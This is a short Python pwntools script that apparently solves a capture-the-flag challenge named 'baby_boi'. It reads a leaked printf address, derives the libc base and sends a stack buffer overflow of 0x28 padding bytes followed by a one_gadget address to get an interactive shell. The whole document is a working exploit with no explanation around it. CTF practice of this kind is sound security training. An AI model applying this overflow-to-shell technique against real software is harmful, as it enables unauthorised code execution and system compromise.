from pwn import *

target = process('./baby_boi')#, env={'LD_PRELOAD':'./libc-2.27.so'})
libc = ELF('libc-2.31.so')

target.recvuntil('ere I am: ')

leak = target.recvline()
leak = leak.rstrip()

print(f'leak: {leak}')

base = int(leak, 16) - libc.symbols['printf']

gadget = base + 0xe6c81

payload = b''
payload += bytes([0] * 0x28)
payload += p64(gadget)

target.sendline(payload)

target.interactive()